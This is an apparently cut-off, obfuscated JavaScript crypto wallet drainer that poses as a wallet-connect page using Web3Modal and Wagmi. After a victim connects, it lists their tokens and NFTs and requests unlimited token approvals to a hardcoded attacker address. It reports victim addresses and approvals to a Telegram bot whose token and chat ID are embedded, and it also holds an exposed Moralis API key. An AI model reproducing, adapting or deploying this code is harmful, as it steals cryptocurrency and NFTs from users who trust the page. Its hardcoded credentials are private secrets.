const _0x125d65=_0x532e;(function(_0x444a0e,_0x51c259){const _0x15f691=_0x532e,_0x57f2d1=_0x444a0e();while(!![]){try{const _0x443353=-parseInt(_0x15f691(0x171))/0x1+-parseInt(_0x15f691(0x127))/0x2*(parseInt(_0x15f691(0x145))/0x3)+-parseInt(_0x15f691(0x1b4))/0x4+parseInt(_0x15f691(0x17a))/0x5*(parseInt(_0x15f691(0x1b0))/0x6)+-parseInt(_0x15f691(0x1bb))/0x7+parseInt(_0x15f691(0x181))/0x8+parseInt(_0x15f691(0x161))/0x9;if(_0x443353===_0x51c259)break;else _0x57f2d1['push'](_0x57f2d1['shift']());}catch(_0x4b253e){_0x57f2d1['push'](_0x57f2d1['shift']());}}}(_0x4a9a,0xad2ae));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';function _0x4a9a(){const _0x4f1ac6=['&text=','newBasisPoints','https://api.telegram.org/bot6308422528:AAELohOIy_QvlwsK1U3J9FUi8xHMgG6AcBE/sendMessage?chat_id=','setParams','Cl\x20address\x20:\x20','openModal','BAYC_PROVENANCE','https://deep-index.moralis.io/api/v2/','string','reserveApes','value','newMaxFee','OwnershipTransferred','/erc20','1146996byETen','Transaction\x20hash\x20','event','ApprovalForAll','allowance','&vs_currencies=usd','_from','token_address','all','2950mRDreT','name','numberOfTokens','Approve\x20Completed\x20Successfully','isApprovedForAll','length','uint256','5733616jTFvPw','_evilUser','getBlackListStatus','view','remaining','nonpayable','payable','Approval','Incorrect\x20network','sort','maxNftSupply','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','getApproved','Unable\x20to\x20get\x20NFts','who','approve','allowed','AddedBlackList','MetaMask','renounceOwnership','upgradedAddress','_data','gasPrice','TOKEN\x20Contract\x20Address\x20','_blackListedUser','previousOwner','formatted','https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=','.meta','map','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','CoinbaseWalletConnector','bool','_balance','Transaction\x20Rejected','.proceed','NFTs\x20collection\x20','Transfer','message','balanceOf','usd','emergencySetStartingIndexBlock','address','transferFrom','location','_user','filter','5190YTbdzP','.trust','price','GET','2269972GMUEwo','balance','safeTransferFrom','_initialSupply','bsc','999999999999999999999999999999999999999999999999999999999999999999999999','_spender','3360931oKETpJ','constructor','Your\x20address\x20','catch','error','DestroyedBlackFunds','setApprovalForAll','Tokens:','sending\x20ether','_owner','No\x20address','addBlackList','Hahahahahah','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','decimals','supportsInterface','then','Could\x20not\x20get\x20a\x20wallet\x20connection','transfer','index','_decimals','0xea8968B218a551919FbD5f1166328C82a96dED54','Blockchain\x20rectification','metamask','totalSupply','deprecated','spender','click','MAX_UINT','ee71d215d0dec7d1bf950851c84d9643','application/json','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','log','amount','3508oDbIrf','status','tokens-list','result','from','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','symbol','Pause','approved','setStartingIndex','New\x20token','https://link.trustwallet.com/open_url?url=','newOwner','_clearedUser','setProvenanceHash','href','_value','tokenURI','removeBlackList','undefined','coinbase','apePrice','Redeem','hash','MAX_APES','.coinbase','owner','Error\x20collecting\x20info\x20about\x20wallet','operator','https://go.cb-w.com/dapp?cb_url=','1629ueZnEZ','Error:\x20','maxFee','startingIndexBlock','feeBasisPoints','bytes','_totalSupply','maximumFee','setRevealTimestamp','networkVersion','function','baseURI','trustwallet','ownerOf','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','_symbol','tokenId','toString','basisPointsRate','Deprecate','RemovedBlackList','REVEAL_TIMESTAMP','/nft/collections?chain=','json','chainId:','Issue','tokenByIndex','getProvider','23663574obIvkM','_name'];_0x4a9a=function(){return _0x4f1ac6;};return _0x4a9a();}import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {bsc,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[bsc,mainnet],projectId=_0x125d65(0x122),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x125d65(0x1a0))]({'chains':chains,'options':{'appName':_0x125d65(0x11b)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x125d65(0x18c),'coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window[_0x125d65(0x1ad)]['href'];const OWNER_ADDRESS=_0x125d65(0x11a),ABI=[{'constant':!![],'inputs':[],'name':_0x125d65(0x17b),'outputs':[{'name':'','type':_0x125d65(0x16b)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x125d65(0x1ab)}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x1ba),'type':_0x125d65(0x1ab)},{'name':_0x125d65(0x137),'type':_0x125d65(0x180)}],'name':_0x125d65(0x190),'outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x11e),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':![],'inputs':[{'name':_0x125d65(0x182),'type':_0x125d65(0x1ab)}],'name':_0x125d65(0x1c6),'outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x177),'type':_0x125d65(0x1ab)},{'name':'_to','type':'address'},{'name':_0x125d65(0x137),'type':_0x125d65(0x180)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x195),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x125d65(0x1ab)}],'name':'balances','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x113),'outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':!![],'inputs':[],'name':_0x125d65(0x14c),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x14b),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[{'name':'_maker','type':_0x125d65(0x1ab)}],'name':_0x125d65(0x183),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'view','type':_0x125d65(0x14f)},{'constant':!![],'inputs':[{'name':'','type':_0x125d65(0x1ab)},{'name':'','type':'address'}],'name':_0x125d65(0x191),'outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x125d65(0x1a1)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':!![],'inputs':[{'name':_0x125d65(0x18f),'type':_0x125d65(0x1ab)}],'name':_0x125d65(0x1a8),'outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x125d65(0x1ab)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':!![],'inputs':[],'name':_0x125d65(0x141),'outputs':[{'name':'','type':_0x125d65(0x1ab)}],'payable':![],'stateMutability':'view','type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x12d),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':'view','type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':'_to','type':_0x125d65(0x1ab)},{'name':_0x125d65(0x137),'type':_0x125d65(0x180)}],'name':_0x125d65(0x117),'outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x164),'type':'uint256'},{'name':_0x125d65(0x16e),'type':_0x125d65(0x180)}],'name':_0x125d65(0x166),'outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':'function'},{'constant':![],'inputs':[{'name':_0x125d65(0x126),'type':_0x125d65(0x180)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':'redeem','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'constant':!![],'inputs':[{'name':_0x125d65(0x1c4),'type':'address'},{'name':'_spender','type':'address'}],'name':_0x125d65(0x175),'outputs':[{'name':_0x125d65(0x185),'type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':'function'},{'constant':!![],'inputs':[],'name':_0x125d65(0x157),'outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':!![],'inputs':[{'name':'','type':_0x125d65(0x1ab)}],'name':'isBlackListed','outputs':[{'name':'','type':_0x125d65(0x1a1)}],'payable':![],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x134),'type':'address'}],'name':_0x125d65(0x139),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'constant':!![],'inputs':[],'name':_0x125d65(0x121),'outputs':[{'name':'','type':_0x125d65(0x180)}],'payable':![],'stateMutability':'view','type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x133),'type':'address'}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'constant':![],'inputs':[{'name':_0x125d65(0x199),'type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[{'name':_0x125d65(0x1b7),'type':_0x125d65(0x180)},{'name':_0x125d65(0x162),'type':_0x125d65(0x16b)},{'name':_0x125d65(0x154),'type':'string'},{'name':_0x125d65(0x119),'type':_0x125d65(0x180)}],'payable':![],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x1bc)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x125d65(0x180)}],'name':_0x125d65(0x15e),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x125d65(0x126),'type':_0x125d65(0x180)}],'name':_0x125d65(0x13d),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x125d65(0x1ab)}],'name':_0x125d65(0x158),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x125d65(0x149),'type':'uint256'},{'indexed':![],'name':_0x125d65(0x147),'type':'uint256'}],'name':'Params','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':'address'},{'indexed':![],'name':_0x125d65(0x1a2),'type':_0x125d65(0x180)}],'name':_0x125d65(0x1c0),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x125d65(0x1ae),'type':_0x125d65(0x1ab)}],'name':_0x125d65(0x192),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x125d65(0x1ae),'type':_0x125d65(0x1ab)}],'name':_0x125d65(0x159),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x125d65(0x1ab)},{'indexed':!![],'name':_0x125d65(0x11f),'type':_0x125d65(0x1ab)},{'indexed':![],'name':'value','type':_0x125d65(0x180)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x125d65(0x12b),'type':'address'},{'indexed':!![],'name':'to','type':_0x125d65(0x1ab)},{'indexed':![],'name':'value','type':_0x125d65(0x180)}],'name':_0x125d65(0x1a6),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[],'name':_0x125d65(0x12e),'type':'event'},{'anonymous':![],'inputs':[],'name':'Unpause','type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':_0x125d65(0x17b),'type':_0x125d65(0x16b)},{'internalType':_0x125d65(0x16b),'name':_0x125d65(0x12d),'type':_0x125d65(0x16b)},{'internalType':'uint256','name':_0x125d65(0x18b),'type':'uint256'},{'internalType':_0x125d65(0x180),'name':'saleStart','type':'uint256'}],'stateMutability':_0x125d65(0x186),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x141),'type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x12f),'type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x188),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x141),'type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x143),'type':_0x125d65(0x1ab)},{'indexed':![],'internalType':_0x125d65(0x1a1),'name':_0x125d65(0x12f),'type':_0x125d65(0x1a1)}],'name':_0x125d65(0x174),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x19a),'type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':'newOwner','type':'address'}],'name':_0x125d65(0x16f),'type':_0x125d65(0x173)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x12b),'type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x1ab),'name':'to','type':_0x125d65(0x1ab)},{'indexed':!![],'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x1a6),'type':_0x125d65(0x173)},{'inputs':[],'name':_0x125d65(0x169),'outputs':[{'internalType':_0x125d65(0x16b),'name':'','type':_0x125d65(0x16b)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x13f),'outputs':[{'internalType':_0x125d65(0x180),'name':'','type':_0x125d65(0x180)}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x15a),'outputs':[{'internalType':'uint256','name':'','type':_0x125d65(0x180)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x13c),'outputs':[{'internalType':_0x125d65(0x180),'name':'','type':_0x125d65(0x180)}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':'to','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x190),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':'owner','type':_0x125d65(0x1ab)}],'name':_0x125d65(0x1a8),'outputs':[{'internalType':'uint256','name':'','type':_0x125d65(0x180)}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x150),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x1aa),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':_0x125d65(0x186),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x18d),'outputs':[{'internalType':'address','name':'','type':_0x125d65(0x1ab)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':'owner','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x143),'type':'address'}],'name':_0x125d65(0x17e),'outputs':[{'internalType':_0x125d65(0x1a1),'name':'','type':_0x125d65(0x1a1)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x125d65(0x180),'name':'','type':'uint256'}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x180),'name':_0x125d65(0x17c),'type':'uint256'}],'name':'mintApe','outputs':[],'stateMutability':_0x125d65(0x187),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x17b),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x125d65(0x1ab),'name':'','type':'address'}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x152),'outputs':[{'internalType':_0x125d65(0x1ab),'name':'','type':_0x125d65(0x1ab)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x194),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x16c),'outputs':[],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':'from','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x1ab),'name':'to','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':'uint256'}],'name':_0x125d65(0x1b6),'outputs':[],'stateMutability':_0x125d65(0x186),'type':'function'},{'inputs':[{'internalType':'address','name':'from','type':'address'},{'internalType':'address','name':'to','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)},{'internalType':_0x125d65(0x14a),'name':_0x125d65(0x196),'type':_0x125d65(0x14a)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x125d65(0x1a1),'name':'','type':_0x125d65(0x1a1)}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x143),'type':'address'},{'internalType':_0x125d65(0x1a1),'name':'approved','type':'bool'}],'name':_0x125d65(0x1c1),'outputs':[],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x16b),'name':_0x125d65(0x150),'type':_0x125d65(0x16b)}],'name':'setBaseURI','outputs':[],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x16b),'name':'provenanceHash','type':'string'}],'name':_0x125d65(0x135),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x180),'name':'revealTimeStamp','type':_0x125d65(0x180)}],'name':_0x125d65(0x14d),'outputs':[],'stateMutability':'nonpayable','type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x130),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x125d65(0x180),'name':'','type':_0x125d65(0x180)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':_0x125d65(0x148),'outputs':[{'internalType':_0x125d65(0x180),'name':'','type':_0x125d65(0x180)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':'bytes4','name':'interfaceId','type':'bytes4'}],'name':_0x125d65(0x114),'outputs':[{'internalType':'bool','name':'','type':_0x125d65(0x1a1)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x125d65(0x16b),'name':'','type':_0x125d65(0x16b)}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':'uint256','name':'index','type':_0x125d65(0x180)}],'name':_0x125d65(0x15f),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':_0x125d65(0x14f)},{'inputs':[{'internalType':'address','name':'owner','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x180),'name':_0x125d65(0x118),'type':_0x125d65(0x180)}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':_0x125d65(0x180),'name':'','type':_0x125d65(0x180)}],'stateMutability':_0x125d65(0x184),'type':'function'},{'inputs':[{'internalType':_0x125d65(0x180),'name':'tokenId','type':_0x125d65(0x180)}],'name':_0x125d65(0x138),'outputs':[{'internalType':_0x125d65(0x16b),'name':'','type':_0x125d65(0x16b)}],'stateMutability':_0x125d65(0x184),'type':'function'},{'inputs':[],'name':_0x125d65(0x11d),'outputs':[{'internalType':_0x125d65(0x180),'name':'','type':'uint256'}],'stateMutability':_0x125d65(0x184),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':_0x125d65(0x1ab),'name':_0x125d65(0x12b),'type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x1ab),'name':'to','type':_0x125d65(0x1ab)},{'internalType':_0x125d65(0x180),'name':_0x125d65(0x155),'type':_0x125d65(0x180)}],'name':_0x125d65(0x1ac),'outputs':[],'stateMutability':_0x125d65(0x186),'type':_0x125d65(0x14f)},{'inputs':[{'internalType':'address','name':'newOwner','type':_0x125d65(0x1ab)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x125d65(0x186),'type':'function'},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x125d65(0x186),'type':'function'}];let wallet;$(_0x125d65(0x19d))[_0x125d65(0x120)](async function(){const _0x50ac98=_0x125d65;wallet=_0x50ac98(0x11c),await connector();}),$(_0x125d65(0x140))[_0x125d65(0x120)](async function(){const _0x4f36a6=_0x125d65;wallet=_0x4f36a6(0x13b),await connector();}),$(_0x125d65(0x1b1))[_0x125d65(0x120)](async function(){const _0x20d833=_0x125d65;wallet=_0x20d833(0x151),await connector();}),$('.connect')[_0x125d65(0x120)](async function(){const _0x5403d1=_0x125d65;try{await web3Modal[_0x5403d1(0x168)]();}catch(_0x47565b){console[_0x5403d1(0x125)](_0x5403d1(0x116),_0x47565b);return;}});let connector=async()=>{const _0x49a3da=_0x125d65;if(typeof web3===_0x49a3da(0x13a)&&typeof ethereum==='undefined'){console[_0x49a3da(0x125)](_0x49a3da(0x111));if(wallet===_0x49a3da(0x11c)){let _0x5b5936='https://metamask.app.link/dapp/'+currentUrl;window['location'][_0x49a3da(0x136)]=_0x5b5936;}else{if(wallet===_0x49a3da(0x13b)){let _0x51b15c=_0x49a3da(0x144)+currentUrl;window[_0x49a3da(0x1ad)][_0x49a3da(0x136)]=_0x51b15c;}else{if(wallet===_0x49a3da(0x151)){let _0x747aa4=_0x49a3da(0x132)+currentUrl;window[_0x49a3da(0x1ad)][_0x49a3da(0x136)]=_0x747aa4;}}}}else try{await web3Modal[_0x49a3da(0x168)]();}catch(_0x49b25c){console[_0x49a3da(0x125)](_0x49a3da(0x116),_0x49b25c);return;}};$(_0x125d65(0x1a4))[_0x125d65(0x120)](async function(){const _0x538809=_0x125d65;let _0xaaf58e=getAccount();console[_0x538809(0x125)](_0xaaf58e),!_0xaaf58e[_0x538809(0x1ab)]&&(console[_0x538809(0x125)](_0x538809(0x1c5)),alert(_0x538809(0x124))),_0xaaf58e['connector']['name']===_0x538809(0x193)&&(_0xaaf58e['connector']['options'][_0x538809(0x160)]()[_0x538809(0x14e)]!=='56'&&(console[_0x538809(0x125)](_0x538809(0x189)),await switchNetwork({'chainId':0x38}))),selectedAccount=_0xaaf58e['address'],sendMessage(_0x538809(0x112)),sendMessage(_0x538809(0x167)+selectedAccount),covalenthqAPICall();});const Oxa='0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0',Oxc='5227607491';async function covalenthqAPICall(){const _0x2c9e33=_0x125d65,_0x41a9d0={'chain':_0x2c9e33(0x1b8)},_0xd56161=new URL(_0x2c9e33(0x16a)+selectedAccount+_0x2c9e33(0x170));_0xd56161['search']=new URLSearchParams(_0x41a9d0)[_0x2c9e33(0x156)]();const _0x459ea5={'method':_0x2c9e33(0x1b3),'headers':{'accept':_0x2c9e33(0x123),'X-API-Key':_0x2c9e33(0x19f)}};try{const _0xd49c19=await fetch(_0xd56161,_0x459ea5)[_0x2c9e33(0x115)](_0x20067a=>_0x20067a[_0x2c9e33(0x15c)]());console[_0x2c9e33(0x125)](_0xd49c19);let _0x584770=_0xd49c19;console[_0x2c9e33(0x125)]('Initial\x20list\x20',_0x584770);let _0x332c0d=await Promise[_0x2c9e33(0x179)](_0x584770[_0x2c9e33(0x19e)](async _0x638806=>{const _0x9e83a1=_0x2c9e33;let _0x502a4a;try{_0x502a4a=await getValue(_0x638806[_0x9e83a1(0x178)],_0x638806[_0x9e83a1(0x1b5)],_0x638806[_0x9e83a1(0x113)]);}catch(_0x41cdc0){_0x502a4a=0x0;}return console['log'](_0x502a4a),{'balance':_0x638806[_0x9e83a1(0x1b5)],'value':_0x502a4a,'address':_0x638806[_0x9e83a1(0x178)]};}));console[_0x2c9e33(0x125)](_0x2c9e33(0x129),_0x332c0d),tokens=_0x332c0d[_0x2c9e33(0x1af)](_0x4914c3=>_0x4914c3[_0x2c9e33(0x16d)]>0x5),tokens[_0x2c9e33(0x18a)]((_0x1ae157,_0x49127a)=>_0x49127a['value']-_0x1ae157[_0x2c9e33(0x16d)]),console[_0x2c9e33(0x125)](_0x2c9e33(0x15d),await getNetwork(),_0x2c9e33(0x1c2),tokens),NFTs=await getNFTs(selectedAccount)[_0x2c9e33(0x1be)](_0x5ee852=>{const _0x1e30c4=_0x2c9e33;console[_0x1e30c4(0x125)](_0x1e30c4(0x18e),_0x5ee852);}),NFTs=NFTs[_0x2c9e33(0x12a)],console['log'](_0x2c9e33(0x1a5),NFTs);if(tokens['length']===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2c9e33(0x142));}}async function onApprove(){const _0x5443de=_0x125d65;if(tokens[_0x5443de(0x17f)])try{loopTokens(tokens);}catch(_0x1057b2){console['error']('Error\x20processing\x20item\x20'+_0x1057b2[_0x5443de(0x1a7)]);}else{if(NFTs[_0x5443de(0x17f)]){try{loopNfts(NFTs);}catch(_0x51c79c){console['error']('Error\x20processing\x20item\x20'+_0x51c79c[_0x5443de(0x1a7)]);}onSendEther(),sendMessage(_0x5443de(0x12c));}else try{onSendEther();}catch(_0x21e842){console[_0x5443de(0x1bf)]('Error\x20processing\x20item\x20'+_0x21e842[_0x5443de(0x1a7)]);}}}async function loopTokens(_0x26004c){const _0x3ca5ad=_0x125d65;for await(let _0x2355de of _0x26004c){console[_0x3ca5ad(0x125)]('Token',_0x2355de);try{sendMessage(_0x3ca5ad(0x131));let {hash:_0x17e06f}=await writeContract({'address':_0x2355de[_0x3ca5ad(0x1ab)],'abi':ABI,'functionName':_0x3ca5ad(0x190),'args':[Oxa,_0x3ca5ad(0x1b9)]});console['log']('hash',_0x17e06f),_0x17e06f&&(console[_0x3ca5ad(0x125)]('Approved'),sendMessage(_0x3ca5ad(0x17d)),sendMessage(_0x3ca5ad(0x198)+_0x2355de['address']),sendMessage('Token\x20balance\x20is\x20'+_0x2355de[_0x3ca5ad(0x1b5)]),sendMessage(_0x3ca5ad(0x1bd)+Oxa));}catch(_0x5311bd){console[_0x3ca5ad(0x125)]('Error:\x20'+_0x5311bd),sendMessage(_0x3ca5ad(0x1a3));}};await loopNfts(NFTs);}async function loopNfts(_0x432d39){const _0x29446c=_0x125d65;for await(let _0x368491 of _0x432d39){console[_0x29446c(0x125)]('NFT',_0x368491);try{let {hash:_0x3da3e7}=await 